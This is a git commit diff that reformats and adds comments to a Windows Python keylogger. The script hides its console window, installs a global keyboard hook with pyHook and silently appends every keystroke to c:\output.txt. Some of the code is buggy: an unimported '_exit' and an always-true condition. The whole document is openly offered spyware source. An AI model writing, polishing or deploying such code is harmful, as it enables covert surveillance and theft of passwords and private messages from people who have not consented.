1260b14258ef75a089f275a1d8190664c10086c2
Ashoksanaka <145904608+Ashoksanaka@users.noreply.github.com>
2024-03-12 00:05:20 +0530

    keylogger_windows.py

--- keylogger_windows.py
+++ keylogger_windows.py
@@ -1,28 +1,41 @@
- import win32api 
-import win32console 
-import win32gui 
-import pythoncom, pyHook 
+# Import necessary libraries
+import win32api
+import win32console
+import win32gui
+import pythoncom
+import pyHook
 
-win = win32console.GetConsoleWindow() 
-win32gui.ShowWindow(win, 0) 
+# Hide the console window
+win = win32console.GetConsoleWindow()
+win32gui.ShowWindow(win, 0)
 
-def OnKeyboardEvent(event): 
-	if event.Ascii==5: 
-		_exit(1) 
-	if event.Ascii !=0 or 8: 
-	 
-		f = open('c:\output.txt', 'r+') 
-		buffer = f.read() 
-		f.close() 
-	 
-		f = open('c:\output.txt', 'w') 
-		keylogs = chr(event.Ascii) 
-		if event.Ascii == 13: 
-		keylogs = '/n'
-		buffer += keylogs 
-		f.write(buffer) 
-		f.close() t 
-hm = pyHook.HookManager() 
-hm.KeyDown = OnKeyboardEvent 
-hm.HookKeyboard() 
-pythoncom.PumpMessages() 
+# Function to handle keyboard events
+def OnKeyboardEvent(event):
+    # If Ctrl+E is pressed, exit the program
+    if event.Ascii == 5:
+        _exit(1)
+    # If the character is not NULL or backspace
+    if event.Ascii != 0 or 8:
+        # Open the output file in read mode
+        f = open('c:\output.txt', 'r+')
+        buffer = f.read()
+        f.close()
+        # Open the output file in write mode
+        f = open('c:\output.txt', 'w')
+        keylogs = chr(event.Ascii)
+        # If Enter key is pressed, add a newline character
+        if event.Ascii == 13:
+            keylogs = '\n'
+        buffer += keylogs
+        f.write(buffer)
+        f.close()
+
+# Create a hook manager instance
+hm = pyHook.HookManager()
+# Assign the OnKeyboardEvent function to handle KeyDown events
+hm.KeyDown = OnKeyboardEvent
+# Hook the keyboard
+hm.HookKeyboard()
+# Start the message loop
+pythoncom.PumpMessages()
+
